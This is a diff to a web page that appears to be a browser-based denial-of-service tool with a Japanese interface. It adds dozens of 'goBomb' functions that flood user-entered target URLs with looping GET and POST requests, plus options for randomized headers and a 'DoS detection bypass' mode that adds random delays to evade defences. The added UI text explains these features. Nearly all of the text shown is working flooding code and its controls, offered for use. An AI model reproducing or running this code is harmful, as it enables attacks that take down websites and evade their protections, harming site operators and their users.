+			var req2 = new Request(bomb, { method: "POST", mode: "cors", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify(postdata)});
+			fetch(req2);
+		}
+		bombCounter();
+		my_sleep(randRange(95, 120));
+	}
+		m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_BypassDos()", randRange(2000, 2500));
+	}
+
+    function goBomb_fetch_nowild_RandH()
+	{
+		var bomb;
+		var postdata = postdata_from_user;
+		for(i = 0; i < m_inWinNum; i++)
+		{
+            bomb = targetsurl[Math.floor(Math.random() * targetsurl.length)];
+            contype = Contypes[Math.floor(Math.random() * Contypes.length)];
+            lang = Langs[Math.floor(Math.random() * Langs.length)];
+            accept = Accepts[Math.floor(Math.random() * Accepts.length)];
+			//fetch GET
+			var req = new Request(bomb, { headers: {"Content-Type": contype, "Accept-Language": lang, "Cache-Control": "no-cache", "Accept": accept, "If-Modified-Since": ifmoded } });
+			fetch(req);
+			//fech POST
+			var req2 = new Request(bomb, { method: "POST", mode: "cors", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify(postdata)});
+			fetch(req2);
+		}
+		bombCounter();
+		m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_RandH()", m_inInterval);
+	}
+
+	function goBomb_fetch_nowild_RandH_BypassDos()
+	{
+		var bomb;
+		var postdata = postdata_from_user;
+		for(j=0; j<10; j++) {
+		for(i = 0; i < randRange(15, 23); i++)
+		{
+            bomb = targetsurl[Math.floor(Math.random() * targetsurl.length)];
+            contype = Contypes[Math.floor(Math.random() * Contypes.length)];
+            lang = Langs[Math.floor(Math.random() * Langs.length)];
+            accept = Accepts[Math.floor(Math.random() * Accepts.length)];
+			//fetch GET
+			var req = new Request(bomb, { headers: {"Content-Type": contype, "Accept-Language": lang, "Cache-Control": "no-cache", "Accept": accept, "If-Modified-Since": ifmoded } });
+			fetch(req);
+			//fech POST
+			var req2 = new Request(bomb, { method: "POST", mode: "cors", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify(postdata)});
+			fetch(req2);
+		}
+		bombCounter();
+		my_sleep(randRange(95, 120));
+	}
+		m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_RandH_BypassDos()", randRange(2000, 2500));
+	}
+
 	function goBomb_fetch_nowild_GET_ONLY()
 	{
 		var bomb;
@@ -971,6 +1609,60 @@ function goBomb_nowild_GET_ONLY()
 		}
 		bombCounter();
 		m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_GET_ONLY()", m_inInterval);
+	}
+
+	function goBomb_fetch_nowild_GET_ONLY_BypassDos()
+	{
+		var bomb;
+		for(j=0; j<10; j++) {
+		for(i = 0; i < randRange(15, 23); i++)
+		{
+            bomb = targetsurl[Math.floor(Math.random() * targetsurl.length)];
+			//fetch GET
+			var req = new Request(bomb, { headers: {"Content-Type": contype, "Accept-Language": lang, "Cache-Control": "no-cache", "Accept": accept, "If-Modified-Since": ifmoded } });
+			fetch(req);
+		}
+		bombCounter();
+		my_sleep(randRange(95, 120));
+	}
+		m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_GET_ONLY_BypassDos()", randRange(2000, 2500));
+	}
+
+    function goBomb_fetch_nowild_GET_ONLY_RandH()
+	{
+		var bomb;
+		for(i = 0; i < m_inWinNum; i++)
+		{
+            bomb = targetsurl[Math.floor(Math.random() * targetsurl.length)];
+            contype = Contypes[Math.floor(Math.random() * Contypes.length)];
+            lang = Langs[Math.floor(Math.random() * Langs.length)];
+            accept = Accepts[Math.floor(Math.random() * Accepts.length)];
+			//fetch GET
+			var req = new Request(bomb, { headers: {"Content-Type": contype, "Accept-Language": lang, "Cache-Control": "no-cache", "Accept": accept, "If-Modified-Since": ifmoded } });
+			fetch(req);
+		}
+		bombCounter();
+		m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_GET_ONLY_RandH()", m_inInterval);
+	}
+
+	function goBomb_fetch_nowild_GET_ONLY_RandH_BypassDos()
+	{
+		var bomb;
+		for(j=0; j<10; j++) {
+		for(i = 0; i < randRange(15, 23); i++)
+		{
+            bomb = targetsurl[Math.floor(Math.random() * targetsurl.length)];
+            contype = Contypes[Math.floor(Math.random() * Contypes.length)];
+            lang = Langs[Math.floor(Math.random() * Langs.length)];
+            accept = Accepts[Math.floor(Math.random() * Accepts.length)];
+			//fetch GET
+			var req = new Request(bomb, { headers: {"Content-Type": contype, "Accept-Language": lang, "Cache-Control": "no-cache", "Accept": accept, "If-Modified-Since": ifmoded } });
+			fetch(req);
+		}
+		bombCounter();
+		my_sleep(randRange(95, 120));
+	}
+		m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_GET_ONLY_RandH_BypassDos()", randRange(2000, 2500));
 	}
 
 function goBomb_fetch_nowild_POST_ONLY()
@@ -986,6 +1678,57 @@ function goBomb_fetch_nowild_POST_ONLY()
 		}
 		bombCounter();
 		m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_POST_ONLY()", m_inInterval);
+	}
+
+	function goBomb_fetch_nowild_POST_ONLY_BypassDos()
+	{
+		var bomb;
+		var postdata = postdata_from_user;
+		for(j=0; j<10; j++) {
+		for(i = 0; i < randRange(15, 23); i++)
+		{
+            bomb = targetsurl[Math.floor(Math.random() * targetsurl.length)];
+			//fech POST
+			var req2 = new Request(bomb, { method: "POST", mode: "cors", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify(postdata)});
+			fetch(req2);
+		}
+		bombCounter();
+		my_sleep(randRange(95, 120));
+	}
+		m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_POST_ONLY_BypassDos()", randRange(2000, 2500));
+	}
+
+    function goBomb_fetch_nowild_POST_ONLY_RandH()
+	{
+		var bomb;
+		var postdata = postdata_from_user;
+		for(i = 0; i < m_inWinNum; i++)
+		{
+            bomb = targetsurl[Math.floor(Math.random() * targetsurl.length)];
+			//fech POST
+			var req2 = new Request(bomb, { method: "POST", mode: "cors", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify(postdata)});
+			fetch(req2);
+		}
+		bombCounter();
+		m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_POST_ONLY_RandH()", m_inInterval);
+	}
+
+	function goBomb_fetch_nowild_POST_ONLY_RandH_BypassDos()
+	{
+		var bomb;
+		var postdata = postdata_from_user;
+		for(j=0; j<10; j++) {
+		for(i = 0; i < randRange(15, 23); i++)
+		{
+            bomb = targetsurl[Math.floor(Math.random() * targetsurl.length)];
+			//fech POST
+			var req2 = new Request(bomb, { method: "POST", mode: "cors", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify(postdata)});
+			fetch(req2);
+		}
+		bombCounter();
+		my_sleep(randRange(95, 120));
+	}
+		m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_POST_ONLY_RandH_BypassDos()", randRange(2000, 2500));
 	}
 
 
@@ -1007,6 +1750,72 @@ function goBomb_fetch_nowild_POST_ONLY()
 		m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_wildurl()", m_inInterval);
 	}
 
+	function goBomb_fetch_nowild_wildurl_BypassDos()
+	{
+		var bomb_url;
+		var postdata = postdata_from_user;
+		for(j=0; j<10; j++) {
+		for(i = 0; i < randRange(15, 23); i++)
+		{
+			bomb_url = convurl_url(1);
+			//fetch GET
+			var req = new Request(bomb_url, { headers: {"Content-Type": contype, "Accept-Language": lang, "Cache-Control": "no-cache", "Accept": accept, "If-Modified-Since": ifmoded } });
+			fetch(req);
+			//fech POST
+			var req2 = new Request(bomb_url, { method: "POST", mode: "cors", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify(postdata)});
+			fetch(req2);
+		}
+		bombCounter();
+		my_sleep(randRange(95, 120));
+	}
+		m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_wildurl_BypassDos()", randRange(2000, 2500));
+	}
+
+    function goBomb_fetch_nowild_wildurl_RandH()
+	{
+		var bomb_url;
+		var postdata = postdata_from_user;
+		for(i = 0; i < m_inWinNum; i++)
+		{
+			bomb_url = convurl_url(1);
+            contype = Contypes[Math.floor(Math.random() * Contypes.length)];
+            lang = Langs[Math.floor(Math.random() * Langs.length)];
+            accept = Accepts[Math.floor(Math.random() * Accepts.length)];
+			//fetch GET
+			var req = new Request(bomb_url, { headers: {"Content-Type": contype, "Accept-Language": lang, "Cache-Control": "no-cache", "Accept": accept, "If-Modified-Since": ifmoded } });
+			fetch(req);
+			//fech POST
+			var req2 = new Request(bomb_url, { method: "POST", mode: "cors", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify(postdata)});
+			fetch(req2);
+		}
+		bombCounter();
+		m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_wildurl_RandH()", m_inInterval);
+	}
+
+	function goBomb_fetch_nowild_wildurl_RandH_BypassDos()
+	{
+		var bomb_url;
+		var postdata = postdata_from_user;
+		for(j=0; j<10; j++) {
+		for(i = 0; i < randRange(15, 23); i++)
+		{
+			bomb_url = convurl_url(1);
+            contype = Contypes[Math.floor(Math.random() * Contypes.length)];
+            lang = Langs[Math.floor(Math.random() * Langs.length)];
+            accept = Accepts[Math.floor(Math.random() * Accepts.length)];
+			//fetch GET
+			var req = new Request(bomb_url, { headers: {"Content-Type": contype, "Accept-Language": lang, "Cache-Control": "no-cache", "Accept": accept, "If-Modified-Since": ifmoded } });
+			fetch(req);
+			//fech POST
+			var req2 = new Request(bomb_url, { method: "POST", mode: "cors", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify(postdata)});
+			fetch(req2);
+		}
+		bombCounter();
+		my_sleep(randRange(95, 120));
+	}
+		m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_wildurl_RandH_BypassDos()", randRange(2000, 2500));
+	}
+
 	function goBomb_fetch_nowild_wildurl_GET_ONLY()
 	{
 		var bomb_url;
@@ -1019,6 +1828,60 @@ function goBomb_fetch_nowild_POST_ONLY()
 		}
 		bombCounter();
 		m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_wildurl_GET_ONLY()", m_inInterval);
+	}
+
+	function goBomb_fetch_nowild_wildurl_GET_ONLY_BypassDos()
+	{
+		var bomb_url;
+		for(j=0; j<10; j++) {
+		for(i = 0; i < randRange(15, 23); i++)
+		{
+			bomb_url = convurl_url(1);
+			//fetch GET
+			var req = new Request(bomb_url, { headers: {"Content-Type": contype, "Accept-Language": lang, "Cache-Control": "no-cache", "Accept": accept, "If-Modified-Since": ifmoded } });
+			fetch(req);
+		}
+		bombCounter();
+		my_sleep(randRange(95, 120));
+	}
+		m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_wildurl_GET_ONLY_BypassDos()", randRange(2000, 2500));
+	}
+
+    function goBomb_fetch_nowild_wildurl_GET_ONLY_RandH()
+	{
+		var bomb_url;
+		for(i = 0; i < m_inWinNum; i++)
+		{
+			bomb_url = convurl_url(1);
+            contype = Contypes[Math.floor(Math.random() * Contypes.length)];
+            lang = Langs[Math.floor(Math.random() * Langs.length)];
+            accept = Accepts[Math.floor(Math.random() * Accepts.length)];
+			//fetch GET
+			var req = new Request(bomb_url, { headers: {"Content-Type": contype, "Accept-Language": lang, "Cache-Control": "no-cache", "Accept": accept, "If-Modified-Since": ifmoded } });
+			fetch(req);
+		}
+		bombCounter();
+		m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_wildurl_GET_ONLY_RandH()", m_inInterval);
+	}
+
+	function goBomb_fetch_nowild_wildurl_GET_ONLY_RandH_BypassDos()
+	{
+		var bomb_url;
+		for(j=0; j<10; j++) {
+		for(i = 0; i < randRange(15, 23); i++)
+		{
+			bomb_url = convurl_url(1);
+            contype = Contypes[Math.floor(Math.random() * Contypes.length)];
+            lang = Langs[Math.floor(Math.random() * Langs.length)];
+            accept = Accepts[Math.floor(Math.random() * Accepts.length)];
+			//fetch GET
+			var req = new Request(bomb_url, { headers: {"Content-Type": contype, "Accept-Language": lang, "Cache-Control": "no-cache", "Accept": accept, "If-Modified-Since": ifmoded } });
+			fetch(req);
+		}
+		bombCounter();
+		my_sleep(randRange(95, 120));
+	}
+		m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_wildurl_GET_ONLY_RandH_BypassDos()", randRange(2000, 2500));
 	}
 
 	function goBomb_fetch_nowild_wildurl_POST_ONLY()
@@ -1034,6 +1897,57 @@ function goBomb_fetch_nowild_POST_ONLY()
 		}
 		bombCounter();
 		m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_wildurl_POST_ONLY()", m_inInterval);
+	}
+
+	function goBomb_fetch_nowild_wildurl_POST_ONLY_BypassDos()
+	{
+		var bomb_url;
+		var postdata = postdata_from_user;
+		for(j=0; j<10; j++) {
+		for(i = 0; i < randRange(15, 23); i++)
+		{
+			bomb_url = convurl_url(1);
+			//fech POST
+			var req2 = new Request(bomb_url, { method: "POST", mode: "cors", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify(postdata)});
+			fetch(req2);
+		}
+		bombCounter();
+		my_sleep(randRange(95, 120));
+	}
+		m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_wildurl_POST_ONLY_BypassDos()", randRange(2000, 2500));
+	}
+
+    function goBomb_fetch_nowild_wildurl_POST_ONLY_RandH()
+	{
+		var bomb_url;
+		var postdata = postdata_from_user;
+		for(i = 0; i < m_inWinNum; i++)
+		{
+			bomb_url = convurl_url(1);
+			//fech POST
+			var req2 = new Request(bomb_url, { method: "POST", mode: "cors", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify(postdata)});
+			fetch(req2);
+		}
+		bombCounter();
+		m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_wildurl_POST_ONLY_RandH()", m_inInterval);
+	}
+
+	function goBomb_fetch_nowild_wildurl_POST_ONLY_RandH_BypassDos()
+	{
+		var bomb_url;
+		var postdata = postdata_from_user;
+		for(j=0; j<10; j++) {
+		for(i = 0; i < randRange(15, 23); i++)
+		{
+			bomb_url = convurl_url(1);
+			//fech POST
+			var req2 = new Request(bomb_url, { method: "POST", mode: "cors", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify(postdata)});
+			fetch(req2);
+		}
+		bombCounter();
+		my_sleep(randRange(95, 120));
+	}
+		m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_wildurl_POST_ONLY_RandH_BypassDos()", randRange(2000, 2500));
 	}
 
 	async function stopBomb_fetch()
@@ -1099,7 +2013,7 @@ function goBomb_fetch_nowild_POST_ONLY()
 		m_stBomburl = document.m_form1.m_tbUrl.value;
         targetsurl = m_stBomburl.split("\n").filter(Boolean);
         bomb = targetsurl[Math.floor(Math.random() * targetsurl.length)];
-		url_pingRequest = "https://check-host.net/check-ping?host=" + bomb + "&max_nodes=10";
+		url_pingRequest = "https://check-host.net/check-ping?host=" + bomb + "&max_nodes=5";
 	    fetch(url_pingRequest, {headers: {Accept: "application/json"}})
     	.then(response => response.text())
     	.then(data => {
@@ -1378,6 +2292,56 @@ details[open] .summary_inner::after {
   font-size: 15px;
 }
 	
+.toggle_input {
+  position: absolute;
+  left: 0;
+  top: 0;
+  width: 100%;
+  height: 100%;
+  z-index: 5;
+  opacity: 0;
+  cursor: pointer;
+}
+
+.toggle_label {
+  width: 45px;
+  height: 21px;
+  background: #ccc;
+  position: relative;
+  display: inline-block;
+  border-radius: 40px;
+  transition: 0.4s;
+  box-sizing: border-box;
+}
+
+.toggle_label:after {
+  content: "";
+  position: absolute;
+  width: 20px;
+  height: 20px;
+  border-radius: 100%;
+  left: 0;
+  top: 0;
+  z-index: 2;
+  background: #fff;
+  box-shadow: 0 0 5px rgba(0, 0, 0, 0.2);
+  transition: 0.4s;
+}
+
+.toggle_input:checked + .toggle_label {
+  background-color: #4BD865;
+}
+
+.toggle_input:checked + .toggle_label:after {
+  left: 24px;
+}
+
+.toggle_button {
+  position: relative;
+  width: 45px;
+  height: 21px;
+  margin: auto;
+}
 
 </style>
 
@@ -1477,7 +2441,7 @@ security.fileuri.strict_origin_policy：<mark>false</mark></span>
 	  <details>
 		<summary>
 		  <span class="summary_inner">
-			<strong><font color="red">[クロスドメイン制約の回避方法 for Android/Chromebook]</font></strong><span class="icon"></span>
+			<strong><font color="red">[修正版][クロスドメイン制約の回避方法 for Android/Chromebook]</font></strong><span class="icon"></span>
 		  </span>
 		</summary>
 		<div class="content">   
@@ -1554,19 +2518,18 @@ security.fileuri.strict_origin_policy：<mark>false</mark></span>
     <details>
       <summary>
         <span class="summary_inner">
-          <font color="lime">[New]</font>[対象URLについて]<span class="icon"></span>
+          [対象URLについて]<span class="icon"></span>
         </span>
       </summary>
       <div class="content">
 				<ul>
 					<li>訪問したいサイトのURLをhttpsから入力してください。</li>
-                    <li>複数のURLを入力できます。訪問時にはその中のURLをすべて訪問します。同じサイト上にある複数のページurlを入力すると効果的です</li>
+                    <li>複数行入力できます。同じサイト上にある複数のページurlを入力すると効果的です</li>
 				</ul>
                 <b>例: https://www.mokuhyo.comにa.htmlとb.htmlとc.htmlというページある場合次のように入力</b>
 				<b>https://www.mokuhyo.com/a.html</b>
 				<b>https://www.mokuhyo.com/b.html</b>
 				<b>https://www.mokuhyo.com/c.html</b>
-	      <ul><font color="red">注意: https://から始まるもの以外を入力したり、URLの途中で改行しないでください</font></ul>
 			</div>
     </details>
   </div>
@@ -1766,6 +2729,48 @@ security.fileuri.strict_origin_policy：<mark>false</mark></span>
 	  </details>
 	</div>
   </div>
+
+  <div class="wrapper">
+	<div class="wrapper_normalIcon">
+  
+	  <details>
+		<summary>
+		  <span class="summary_inner">
+			[ランダムなヘッダーについて]<span class="icon"></span>
+		  </span>
+		</summary>
+		<div class="content">
+			<ul>
+			<li>AcceptやAccept-Languageをランダムなものに変更します。</li>
+			<li><font color="red">ただし、大幅に速度は低下します</font></li>
+			<li><font color="red">この機能はfetch-api型（開始3）でのみ使用可能です</font></li>
+			<li><mark>よくわからない場合はオフのままにしてください</mark></li>
+		  </ul>
+  </div>
+	  </details>
+	</div>
+  </div>
+
+  <div class="wrapper">
+	<div class="wrapper_normalIcon">
+  
+	  <details>
+		<summary>
+		  <span class="summary_inner">
+			[Dos検知回避機能について]<span class="icon"></span>
+		  </span>
+		</summary>
+		<div class="content">
+			<ul>
+			<li>速度を落とし数ミリ秒単位でランダムに遅延を発生させて訪問します。</li>
+			<li><font color="red">文字通り、速度は大幅に低下します</font></li>
+			<li><font color="red">この機能はfetch-api型（開始3）でのみ使用可能です</font></li>
+			<li><mark>よくわからない場合はオフのままにしてください。</mark></li>
+		  </ul>
+  </div>
+	  </details>
+	</div>
+  </div>
   
 
 <br>
@@ -1783,7 +2788,21 @@ security.fileuri.strict_origin_policy：<mark>false</mark></span>
 	<input type="radio" style="transform: scale(1.5);" id="POSTONLY-MODE" name="SELECT" value="3" onclick="post_input_disabler(this.checked);">
 	<label for="inq3">POSTだけ</label>
 </p>
-<b>【対象URL】※複数のURL入力可能</b><br>
+<label for="inq4">ランダムなヘッダー値を使用する<font color="red">(説明欄必読)</font></label>
+<div class="toggle_button">
+    <input  id="RandomHeaders" class="toggle_input" type='checkbox'/>
+    <label for="toggle" class="toggle_label" />
+</div>
+<br>
+
+<label for="inq4">Dos検知回避機能を使用する<font color="red">(説明欄必読)</font></label>
+<div class="toggle_button">
+    <input  id="BypassDosDetection" class="toggle_input" type='checkbox'/>
+    <label for="toggle2" class="toggle_label" />
+</div>
+
+<br>
+<b>【対象URL】※複数行入力可能</b><br>
 Wildcard:<input type="checkbox" name="wcc_url" style="transform: scale(1.5);" title="チェックでワイルドカードを使用します。">
 <br>
 <textarea class="css-button-rounded--black" type="text" rows="30" cols="90" name="m_tbUrl" size="55">https://www.google.com
@@ -1808,7 +2827,7 @@ Wildcard:<input type="checkbox" name="wcc" style="transform: scale(1.5);" title=
 <b>[発射ボタン]</b>
 <br>
 
-<input class="css-button-rounded--black" type="button" value="開始1" style="color: lime;" onclick="main();"><input class="css-button-rounded--black" type="button" value="開始2(XML)" onclick="main_XML();"><input class="css-button-rounded--black" type="button" value="開始3(fetch)" onclick="main_fetch();"><br><input class="css-button-rounded--black" type="button" style="color: red;" value="中止" onclick="stopBomb_fetch();stopBomb_normal();stopBomb_XML()">
+<input class="css-button-rounded--black" type="button" value="開始1" style="color: lime;" onclick="main();"><input class="css-button-rounded--black" type="button" value="開始2(XML)" onclick="main_XML();"><input class="css-button-rounded--black" type="button" value="開始3(fetch)" onclick="main_fetch();"><br><input class="css-button-rounded--black" type="button" style="color: red;" value="停止" onclick="stopBomb_fetch();stopBomb_normal();stopBomb_XML()">
 <input class="css-button-rounded--black" type="button" value="ログクリア" style="color: yellow;" onclick="LogClear();">
 <br><br>
 <b>【情報】</b><br>
